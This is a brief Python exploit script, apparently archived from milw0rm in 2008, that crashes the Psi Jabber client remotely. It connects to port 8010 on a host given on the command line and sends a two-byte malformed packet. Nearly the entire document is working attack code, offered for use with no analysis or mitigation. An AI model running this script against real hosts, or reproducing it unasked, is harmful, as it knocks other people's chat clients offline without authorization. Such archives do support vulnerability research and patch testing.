#!/usr/bin/python
#psi jabber client 8010/tcp remote denial of service (win & lin)
#by sha0[at]badchecksum.net
#http://jolmos.blogspot.com

import socket, sys

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    sock.connect((sys.argv[1],8010))
except:
    print 'Cannot connect!'
    sys.exit(1)

try:
    sock.send('\x05\xff')
    print 'Crashed!'
except:
    print 'Cannot send!'

sock.close() 

# milw0rm.com [2008-12-23]
